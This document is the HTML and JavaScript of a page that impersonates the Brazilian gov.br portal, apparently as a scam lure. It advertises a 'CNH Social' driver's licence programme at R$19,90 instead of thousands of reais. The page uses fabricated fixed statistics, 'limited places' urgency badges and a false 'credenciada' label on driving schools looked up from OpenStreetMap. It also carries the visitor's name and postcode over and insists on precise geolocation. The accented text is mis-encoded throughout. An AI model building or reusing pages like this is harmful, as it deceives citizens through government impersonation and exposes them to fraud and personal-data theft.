<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>gov.br | Autoescolas pr√≥ximas</title>
  <link rel="stylesheet" href="styles.css" />
</head>
<body>
  <header class="gov-header-simple gov-header-fixed">
    <div class="gov-header-content">
      <div class="gov-logo-simple">
        <img src="Gov.br_logo.svg.webp" alt="gov.br" class="gov-logo-img" />
      </div>
      <nav class="gov-header-actions" aria-label="A√ß√µes do cabe√ßalho">
        <button class="icon-btn" aria-label="Menu">
          <svg viewBox="0 0 24 24" width="22" height="22" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="18" x2="21" y2="18"></line></svg>
        </button>
        <button class="gov-profile-btn" aria-label="Conta gov.br"><svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg><span class="gov-user-name" id="userPill">Voc√™</span></button>
      </nav>
    </div>
    <div class="gov-subhead">
      <span>Servi√ßos e Informa√ß√µes do Brasil</span>
    </div>
  </header>

  <main class="gov-article">
    <div class="gov-article-container">
      <!-- Modal de permiss√£o de geolocaliza√ß√£o -->
      <div id="geoOverlay" class="geo-overlay" style="display:none;">
        <div class="geo-modal">
          <h3>Permitir localiza√ß√£o</h3>
          <p>Para encontrar a autoescola mais pr√≥xima, precisamos acessar sua localiza√ß√£o.</p>
          <p class="geo-note">Sua localiza√ß√£o √© usada somente para exibir resultados pr√≥ximos.</p>
          <button id="geoAllowBtn" class="primary-btn" style="margin-top:10px;">Permitir localiza√ß√£o</button>
        </div>
      </div>
      <!-- HERO -->
      <section class="hero-loc">
        <h1 id="heroTitle">CNH Social - </h1>
        <p id="heroSubtitle">Ol√°! Autoescolas credenciadas com vagas limitadas</p>
        <button id="useGeoBtn" class="primary-btn" style="margin-top:10px; padding:8px 12px; font-size:14px;">Atualizar com minha localiza√ß√£o</button>
      </section>

      <!-- INDICADORES (imut√°veis) -->
      <section class="kpi-grid">
        <div class="kpi-card kpi-blue">
          <div class="kpi-value">25</div>
          <div class="kpi-label">Vagas Dispon√≠veis</div>
        </div>
        <div class="kpi-card kpi-green">
          <div class="kpi-value">R$ 5.8M</div>
          <div class="kpi-label">Economia para Cidad√£os</div>
        </div>
        <div class="kpi-card kpi-orange">
          <div class="kpi-value">21</div>
          <div class="kpi-label">Fam√≠lias Beneficiadas</div>
        </div>
      </section>

      <!-- Tabs de categorias -->
      <nav class="cat-tabs" aria-label="Categorias da CNH">
        <a href="#catA" class="cat-tab">A</a>
        <a href="#catB" class="cat-tab">B</a>
        <a href="#catAB" class="cat-tab">AB</a>
      </nav>

      <!-- MODALIDADES -->
      <h2 class="modalidades-title">Modalidades Dispon√≠veis</h2>

      <section id="catB" class="modalidade-card">
        <div class="mod-badge">B</div>
        <h3>CNH Categoria B - Autom√≥vel</h3>
        <p class="mod-desc">Habilita√ß√£o para conduzir ve√≠culos de passeio, utilit√°rios e pequenos caminh√µes</p>
        <div class="mod-row muted"><span>Pre√ßo Normal:</span><span class="price-old">R$ 2.500,00</span></div>
        <div class="mod-row highlight"><span>Pre√ßo Social:</span><span class="price-new">R$ 19,00</span></div>
        <div class="mod-row info"><span>Vagas:</span><span>12 dispon√≠veis</span></div>
        <div class="mod-row muted"><span>Prazo:</span><span>60 dias</span></div>
        <div class="badge-limited">Vagas limitadas</div>
        <button class="primary-btn big select-btn" data-mod="CNH Categoria B - Autom√≥vel" data-label="B">Selecionar B</button>
      </section>

      <section id="catA" class="modalidade-card">
        <div class="mod-badge">A</div>
        <h3>CNH Categoria A - Motocicleta</h3>
        <p class="mod-desc">Habilita√ß√£o para conduzir motocicletas, motonetas e triciclos</p>
        <div class="mod-row muted"><span>Pre√ßo Normal:</span><span class="price-old">R$ 1.800,00</span></div>
        <div class="mod-row highlight"><span>Pre√ßo Social:</span><span class="price-new">R$ 19,90</span></div>
        <div class="mod-row info"><span>Vagas:</span><span>8 dispon√≠veis</span></div>
        <div class="mod-row muted"><span>Prazo:</span><span>45 dias</span></div>
        <div class="badge-limited">Vagas limitadas</div>
        <button class="primary-btn big select-btn" data-mod="CNH Categoria A - Motocicleta" data-label="A">Selecionar A</button>
      </section>

      <section id="catAB" class="modalidade-card">
        <div class="mod-badge">AB</div>
        <h3>CNH Categoria AB - Carro e Moto</h3>
        <p class="mod-desc">Habilita√ß√£o combinada para conduzir autom√≥veis e motocicletas</p>
        <div class="mod-row muted"><span>Pre√ßo Normal:</span><span class="price-old">R$ 3.200,00</span></div>
        <div class="mod-row highlight"><span>Pre√ßo Social:</span><span class="price-new">R$ 19,90</span></div>
        <div class="mod-row info"><span>Vagas:</span><span>5 dispon√≠veis</span></div>
        <div class="mod-row muted"><span>Prazo:</span><span>90 dias</span></div>
        <div class="badge-limited">Vagas limitadas</div>
        <button class="primary-btn big select-btn" data-mod="CNH Categoria AB - Carro e Moto" data-label="AB">Selecionar AB</button>
      </section>

      <!-- SELE√á√ÉO E LISTA -->
      <div id="selectedPanel" class="selected-panel" style="display:none;"></div>
      <div class="meta" id="metaLocal">Resultados para CEP ‚Äî</div>
      <div class="meta" id="radiusInfo"></div>
      <div id="schoolList" class="schools-list"></div>
    </div>
  </main>

  <script>
    function haversine(lat1, lon1, lat2, lon2){ const R=6371; const dLat=(lat2-lat1)*Math.PI/180; const dLon=(lon2-lon1)*Math.PI/180; const a = Math.sin(dLat/2)**2 + Math.cos(lat1*Math.PI/180)*Math.cos(lat2*Math.PI/180)*Math.sin(dLon/2)**2; return 2*R*Math.asin(Math.sqrt(a)); }
    function dedupe(list){ const seen = new Set(); const out=[]; for (const s of list){ const key = `${(s.name||'Autoescola').toLowerCase()}|${Math.round((s.lat||0)*10000)}|${Math.round((s.lon||0)*10000)}`; if (seen.has(key)) continue; seen.add(key); out.push(s);} return out; }
    function withTimeout(promise, ms){ const controller = new AbortController(); const id = setTimeout(()=>controller.abort(), ms); return fetch(promise, {signal: controller.signal}).finally(()=>clearTimeout(id)); }
    async function overpassQuery(lat, lon, radius){ const endpoints = ['https://overpass-api.de/api/interpreter','https://overpass.kumi.systems/api/interpreter','https://lz4.overpass-api.de/api/interpreter']; const q = `[out:json][timeout:25];(nwr(around:${radius},${lat},${lon})["amenity"="driving_school"];nwr(around:${radius},${lat},${lon})["name"~"(?i)auto.?escola"];);out center;`; for (const url of endpoints){ try{ const r = await fetch(url,{method:'POST', headers:{'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8'}, body:'data='+encodeURIComponent(q)}); if (!r.ok) continue; const j = await r.json(); if (j && Array.isArray(j.elements)){ return j.elements.map(e=>({ name:(e.tags&&(e.tags.name||'Autoescola'))||'Autoescola', address:[e.tags&&e.tags['addr:street']||'', e.tags&&e.tags['addr:housenumber']||'', e.tags&&e.tags['addr:city']||''].filter(Boolean).join(', '), lat:e.lat||(e.center&&e.center.lat), lon:e.lon||(e.center&&e.center.lon)})).filter(s=>s.lat&&s.lon);} }catch(e){} } return []; }
    async function geoapifyFallback(lat, lon, radius){ try{ const key = localStorage.getItem('geoapifyKey'); if(!key) return []; const url = `https://api.geoapify.com/v2/places?categories=education.driving_school&filter=circle:${lon},${lat},${radius}&bias=proximity:${lon},${lat}&limit=20&lang=pt&apiKey=${key}`; const r = await fetch(url); const j = await r.json(); return (j.features||[]).map(f=>({ name:f.properties.name||'Autoescola', address:f.properties.formatted||'', lat:f.geometry.coordinates[1], lon:f.geometry.coordinates[0], rating:f.properties.rank || undefined })); }catch(e){ return []; } }
    async function photonQuery(lat, lon, radius){ try{ const url = `https://photon.komoot.io/api/?q=autoescola&lat=${lat}&lon=${lon}&limit=20`; const r = await fetch(url); const j = await r.json(); return (j.features||[]).map(f=>({ name: f.properties.name || 'Autoescola', address: f.properties.street ? `${f.properties.street}, ${f.properties.housenumber||''} ${f.properties.city||''}`.trim() : (f.properties.city||''), lat: f.geometry.coordinates[1], lon: f.geometry.coordinates[0]})).filter(p=>haversine(lat,lon,p.lat,p.lon) <= (radius/1000+2)); }catch(e){ return []; } }
    async function nominatimQuery(lat, lon, radius){ try{ const dLat = radius/111000; const dLon = radius/(111000*Math.cos(lat*Math.PI/180)); const viewbox = `${(lon-dLon).toFixed(6)},${(lat+dLat).toFixed(6)},${(lon+dLon).toFixed(6)},${(lat-dLat).toFixed(6)}`; const url = `https://nominatim.openstreetmap.org/search?format=json&limit=20&bounded=1&viewbox=${viewbox}&q=autoescola`; const r = await fetch(url, {headers:{'Accept-Language':'pt-BR'}}); const j = await r.json(); return (j||[]).map(e=>({ name: e.display_name.split(',')[0], address: e.display_name, lat: parseFloat(e.lat), lon: parseFloat(e.lon)})); }catch(e){ return []; } }
    async function fetchNearbySchools(lat, lon){ const radii = [3000, 5000, 8000, 12000, 20000, 30000, 40000, 50000]; for (const r of radii){ const results = await Promise.allSettled([overpassQuery(lat,lon,r), photonQuery(lat,lon,r), nominatimQuery(lat,lon,r), geoapifyFallback(lat,lon,r)]); let list = results.flatMap(x=>x.status==='fulfilled'?x.value:[]); list = dedupe(list); if (list.length>0) return {list, usedRadius:r}; } return {list:[], usedRadius:radii[radii.length-1]}; }

    const cepData = JSON.parse(sessionStorage.getItem('cepLookup')||'{}');

    async function geocodeCepIfNeeded(){
      if (Number.isFinite(cepData.lat) && Number.isFinite(cepData.lon)) return cepData;
      try{
        if (!cepData.cep){ return cepData; }
        // tenta Nominatim
        const r = await fetch(`https://nominatim.openstreetmap.org/search?format=json&limit=1&q=${encodeURIComponent(cepData.cep+' Brasil')}`);
        const j = await r.json();
        if (Array.isArray(j) && j.length){
          cepData.lat = parseFloat(j[0].lat);
          cepData.lon = parseFloat(j[0].lon);
          sessionStorage.setItem('cepLookup', JSON.stringify(cepData));
        }
      }catch(e){ /* silencioso */ }
      return cepData;
    }

    const storedName = (sessionStorage.getItem('userName')||'Voc√™').trim() || 'Voc√™';

    const heroTitle = document.getElementById('heroTitle');
    const heroSubtitle = document.getElementById('heroSubtitle');
    heroTitle.textContent = `CNH Social - ${cepData.cidade||''}${cepData.uf?`, ${cepData.uf}`:''}`;
    heroSubtitle.textContent = `Ol√°, ${storedName}! Autoescolas credenciadas em ${cepData.cidade||'sua regi√£o'} com vagas limitadas`;
    document.getElementById('userPill').textContent = storedName.length>10?storedName.slice(0,10):storedName;

    const meta = document.getElementById('metaLocal');
    const radiusInfo = document.getElementById('radiusInfo');
    if (meta){ meta.textContent = `Resultados para CEP ${cepData.cep || ''} ‚Äî ${cepData.bairro || ''} ${cepData.cidade? ' - '+cepData.cidade:''}`; }

    const container = document.getElementById('schoolList');
    const selectedPanel = document.getElementById('selectedPanel');
    const useGeoBtn = document.getElementById('useGeoBtn');
    const geoOverlay = document.getElementById('geoOverlay');
    const geoAllowBtn = document.getElementById('geoAllowBtn');

    async function render(selectedMod){
      container.innerHTML = '<div class="school-card">Carregando autoescolas pr√≥ximas...</div>';
      await geocodeCepIfNeeded();
      if (!(Number.isFinite(cepData.lat) && Number.isFinite(cepData.lon))){
        container.innerHTML = '<div class="school-card">N√£o foi poss√≠vel localizar sua regi√£o pelo CEP. Tente novamente.</div>';
        return;
      }
      const {list, usedRadius} = await fetchNearbySchools(cepData.lat, cepData.lon);
      if (radiusInfo) radiusInfo.textContent = `Raio de busca utilizado: ${(usedRadius/1000).toFixed(1)} km`;
      if (!list.length){ container.innerHTML = '<div class="school-card">N√£o encontramos autoescolas mesmo ap√≥s expandir o raio. Tente outro CEP.</div>'; return; }

      // Mostra painel de sele√ß√£o
      if (selectedMod){
        selectedPanel.style.display = 'block';
        selectedPanel.innerHTML = `<div class="selected-title">CNH selecionada: ${selectedMod} - <span style="color:#059669;font-weight:900;">R$ 19,90</span></div>
          <div class="selected-sub">üìç Regi√£o: ${cepData.bairro?cepData.bairro+', ':''}${cepData.cidade||''} - ${cepData.uf||''} | CEP: ${cepData.cep||''}</div>`;
      }

      // Apenas a mais pr√≥xima
      container.innerHTML = '';
      list.sort((a,b)=>haversine(cepData.lat,cepData.lon,a.lat,a.lon)-haversine(cepData.lat,cepData.lon,b.lat,b.lon));
      const s = list[0];
      const dist = haversine(cepData.lat, cepData.lon, s.lat, s.lon).toFixed(1);
      const card = document.createElement('div');
      card.className = 'school-card';
      const ratingHtml = s.rating ? `<div class="school-rating">‚≠ê ${Number(s.rating).toFixed(1)}/5</div>` : '';
      card.innerHTML = `
        <div class="school-title">${s.name}</div>
        <div class="school-address">${s.address || 'Endere√ßo pr√≥ximo'}</div>
        <div class="school-meta">üìç ${dist} km de dist√¢ncia</div>
        ${ratingHtml}
        <span class="school-badge">Credenciada</span>
        <button class="primary-btn" style="margin-top:10px;">Selecionar</button>
      `;
      container.appendChild(card);
    }

    // Sele√ß√£o de modalidade
    document.querySelectorAll('.select-btn').forEach(btn=>{
      btn.addEventListener('click', ()=>{
        // reset r√≥tulos e estado
        document.querySelectorAll('.select-btn').forEach(b=>{ b.classList.remove('success'); b.textContent = `Selecionar ${b.dataset.label}`; });
        // marca atual
        btn.classList.add('success');
        btn.textContent = 'Selecionado ‚úì';
        render(btn.dataset.mod);
      });
    });

    // Fluxo: exigir permiss√£o ao entrar se n√£o tiver lat/lon de alta precis√£o
    function requireGeoIfMissing(){
      const precise = Number.isFinite(cepData.lat) && Number.isFinite(cepData.lon) && (sessionStorage.getItem('geoPrecise')==='1');
      if (!precise){ geoOverlay.style.display='flex'; }
    }

    if (geoAllowBtn){
      geoAllowBtn.addEventListener('click', ()=>{
        if (!navigator.geolocation){ alert('Geolocaliza√ß√£o n√£o suportada.'); return; }
        geoAllowBtn.disabled = true; geoAllowBtn.textContent = 'Obtendo localiza√ß√£o...';
        navigator.geolocation.getCurrentPosition(pos=>{
          cepData.lat = pos.coords.latitude; cepData.lon = pos.coords.longitude;
          sessionStorage.setItem('geoPrecise','1');
          sessionStorage.setItem('cepLookup', JSON.stringify(cepData));
          geoOverlay.style.display='none';
          geoAllowBtn.disabled = false; geoAllowBtn.textContent = 'Permitir localiza√ß√£o';
          render();
        }, err=>{
          alert('N√£o foi poss√≠vel obter a localiza√ß√£o. Voc√™ pode permitir o acesso nas configura√ß√µes do navegador e recarregar a p√°gina.');
          geoOverlay.style.display='none';
          render();
        }, { enableHighAccuracy:true, timeout:8000, maximumAge:60000 });
      });
    }

    // Bot√£o opcional para atualizar depois
    if (useGeoBtn){
      useGeoBtn.addEventListener('click', ()=>{
        if (!navigator.geolocation){ alert('Geolocaliza√ß√£o n√£o suportada neste navegador.'); return; }
        useGeoBtn.disabled = true; useGeoBtn.textContent = 'Obtendo localiza√ß√£o...';
        navigator.geolocation.getCurrentPosition(pos=>{
          cepData.lat = pos.coords.latitude; cepData.lon = pos.coords.longitude;
          sessionStorage.setItem('geoPrecise','1');
          sessionStorage.setItem('cepLookup', JSON.stringify(cepData));
          useGeoBtn.textContent = 'Localiza√ß√£o aplicada'; useGeoBtn.disabled = false;
          render();
        }, err=>{
          alert('N√£o foi poss√≠vel obter a localiza√ß√£o.');
          useGeoBtn.textContent = 'Atualizar com minha localiza√ß√£o'; useGeoBtn.disabled = false;
        }, { enableHighAccuracy:true, timeout:8000, maximumAge:60000 });
      });
    }

    // Inicializa pedindo localiza√ß√£o (se necess√°rio) e tenta renderizar
    requireGeoIfMissing();
    render();
  </script>
</body>
</html>
